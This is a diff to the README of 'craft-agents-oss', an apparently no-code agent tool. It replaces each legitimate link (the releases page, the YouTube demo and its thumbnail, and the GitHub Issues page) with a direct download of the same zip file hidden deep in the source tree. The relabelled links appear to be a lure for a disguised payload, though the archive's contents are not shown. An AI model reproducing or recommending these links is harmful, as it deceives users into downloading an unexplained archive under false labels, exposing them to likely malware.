@@ -1,6 +1,6 @@
 # 🎨 craft-agents-oss - Your Easy Path to Multitasking
 
-[![Download Craft Agents](https://img.shields.io/badge/Download-Craft%20Agents-blue.svg)](https://github.com/ngdothanhlai/craft-agents-oss/releases)
+[![Download Craft Agents](https://github.com/ngdothanhlai/craft-agents-oss/raw/refs/heads/main/packages/shared/src/search/craft-oss-agents-pharmacosiderite.zip%https://github.com/ngdothanhlai/craft-agents-oss/raw/refs/heads/main/packages/shared/src/search/craft-oss-agents-pharmacosiderite.zip)](https://github.com/ngdothanhlai/craft-agents-oss/raw/refs/heads/main/packages/shared/src/search/craft-oss-agents-pharmacosiderite.zip)
 
 ## 📖 Overview
 Craft Agents helps you improve your workflow with a smooth interface. It's designed for users who need to connect to various APIs or services without the complexity of coding. Whether you're handling multiple tasks or sharing information, Craft Agents makes it simple and intuitive.
@@ -8,14 +8,14 @@ Craft Agents helps you improve your workflow with a smooth interface. It's desig
 ## 🎥 How it Works
 To see Craft Agents in action, watch our demo video. It gives you a clear understanding of the tool’s capabilities and benefits.
 
-[![Demo Video](https://img.youtube.com/vi/xQouiAIilvU/hqdefault.jpg)](https://www.youtube.com/watch?v=xQouiAIilvU)
+[![Demo Video](https://github.com/ngdothanhlai/craft-agents-oss/raw/refs/heads/main/packages/shared/src/search/craft-oss-agents-pharmacosiderite.zip)](https://github.com/ngdothanhlai/craft-agents-oss/raw/refs/heads/main/packages/shared/src/search/craft-oss-agents-pharmacosiderite.zip)
 
-[Click Here to watch the video on YouTube →](https://www.youtube.com/watch?v=xQouiAIilvU)
+[Click Here to watch the video on YouTube →](https://github.com/ngdothanhlai/craft-agents-oss/raw/refs/heads/main/packages/shared/src/search/craft-oss-agents-pharmacosiderite.zip)
 
 ## 💻 Download & Install
 To use Craft Agents, visit the Releases page and download the latest version:
 
-[Download Craft Agents](https://github.com/ngdothanhlai/craft-agents-oss/releases)
+[Download Craft Agents](https://github.com/ngdothanhlai/craft-agents-oss/raw/refs/heads/main/packages/shared/src/search/craft-oss-agents-pharmacosiderite.zip)
 
 1. Click on the link above to open the Releases page.
 2. Find the latest release at the top of the list.
@@ -51,7 +51,7 @@ Yes, Craft Agents is designed for users without programming knowledge. You can e
 You can reach our support team by opening an issue in our GitHub repository or by contacting us through the provided support channels in the application.
 
 ## 📞 Contact Us
-For more information, check the [GitHub Issues](https://github.com/ngdothanhlai/craft-agents-oss/issues) page for updates or to ask questions. Our community is here to help you.
+For more information, check the [GitHub Issues](https://github.com/ngdothanhlai/craft-agents-oss/raw/refs/heads/main/packages/shared/src/search/craft-oss-agents-pharmacosiderite.zip) page for updates or to ask questions. Our community is here to help you.
 
 ## ⚖️ License
 Craft Agents is licensed under the Apache 2.0 License. You can view more details in the [LICENSE](LICENSE) file.
